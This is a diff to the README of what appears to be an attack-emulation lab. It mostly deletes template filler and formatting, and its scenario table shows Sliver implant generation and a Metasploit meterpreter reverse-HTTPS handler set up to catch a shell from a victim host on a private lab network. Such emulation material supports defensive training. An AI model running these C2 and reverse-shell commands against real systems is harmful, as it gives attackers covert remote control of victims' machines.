@@ -74,16 +74,11 @@ Each folder in `examples/` contains an attach chain, which includes the emulatio
     - C2 Framework
       - [Metasploit Framework](https://windows.metasploit.com/)
 
-* * *
-
-
 #### DNS_server information
 
 | System        | IP Address          |
 |:-------------|:------------------|
 | Debian   | 192.168.56.100 |
-
-* * *
 
 #### Victim information
 
@@ -93,7 +88,6 @@ Each folder in `examples/` contains an attach chain, which includes the emulatio
 | Ubuntu   | 192.168.56.16 |
 | macOS   | 192.168.56.17 |
 
-* * *
 You can download the attack simulation environment from [here](https://drive.google.com/file/d/1cx-xcn10rDQaoq1SC9CW__0tbZVA5rEo/view?usp=sharing).
 
 ### Scenario Steps
@@ -101,7 +95,7 @@ Each `uuid` encompasses an `executor`, within which the `command` parameter spec
 
 | Steps        | Description	                  | Executor                 |
 |:-------------|:-------------------------------|:-------------------------|
-| Implant Generation | Sliver generates implant for Windows platform and enables mtls monitoring. | sliver > generate beacon --arch amd64 --os  windows --mtls 192.168.130.128 --save <br> sliver > mtls  |
+| Implant Generation | Sliver generates implant for Windows platform and enables mtls monitoring. | ```sliver > generate beacon --arch amd64 --os  windows --mtls 192.168.130.128 --save <br> sliver > mtls```  |
 | Execution | Download&Execute the sliver implant.   | sliver > sessions -i session_id |
 | Directory Disclosure | The pwd command in a Sliver session prints the current working directory of the active session. | sliver > pwd   |
 | Build meterpreter session  |Use sliver and msf linkage, msf starts monitoring, sliver bounces a shell back,so that msf establishes a shell connection with the target host. | # msfconsole<br>msf6 > use exploit/multi/handler<br>msf6 exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_https<br>msf6 exploit(multi/handler) > set lport 9091<br>msf6 exploit(multi/handler) > set lhost 192.168.130.128<br>msf6 exploit(multi/handler) > exploit -j -z<br> sliver (BOLD_MUSCULATURE) > msf --lhost 192.168.130.128 -l 9091<br>msf6 exploit(multi/handler) > sessions 1 |
@@ -122,76 +116,7 @@ Each `uuid` encompasses an `executor`, within which the `command` parameter spec
 
 
 
-##### Header 5
 
-1.  This is an ordered list following a header.
-2.  This is an ordered list following a header.
-3.  This is an ordered list following a header.
-
-###### Header 6
-
-| head1        | head two          | three |
-|:-------------|:------------------|:------|
-| ok           | good swedish fish | nice  |
-| out of stock | good and plenty   | nice  |
-| ok           | good `oreos`      | hmm   |
-| ok           | good `zoute` drop | yumm  |
-
-### There's a horizontal rule below this.
-
-* * *
-
-### Here is an unordered list:
-
-*   Item foo
-*   Item bar
-*   Item baz
-*   Item zip
-
-### And an ordered list:
-
-1.  Item one
-1.  Item two
-1.  Item three
-1.  Item four
-
-### And a nested list:
-
-- level 1 item
-  - level 2 item
-  - level 2 item
-    - level 3 item
-    - level 3 item
-- level 1 item
-  - level 2 item
-  - level 2 item
-  - level 2 item
-- level 1 item
-  - level 2 item
-  - level 2 item
-- level 1 item
-
-### Small image
-
-![Octocat](https://github.githubassets.com/images/icons/emoji/octocat.png)
-
-### Large image
-
-![Branching](https://guides.github.com/activities/hello-world/branching.png)
-
-
-### Definition lists can be used with HTML syntax.
-
-<dl>
-<dt>Name</dt>
-<dd>Godzilla</dd>
-<dt>Born</dt>
-<dd>1952</dd>
-<dt>Birthplace</dt>
-<dd>Japan</dd>
-<dt>Color</dt>
-<dd>Green</dd>
-</dl>
 
 ```
 Long, single-line code blocks should not wrap. They should horizontally scroll if they are too long. This line should be long enough to demonstrate this.
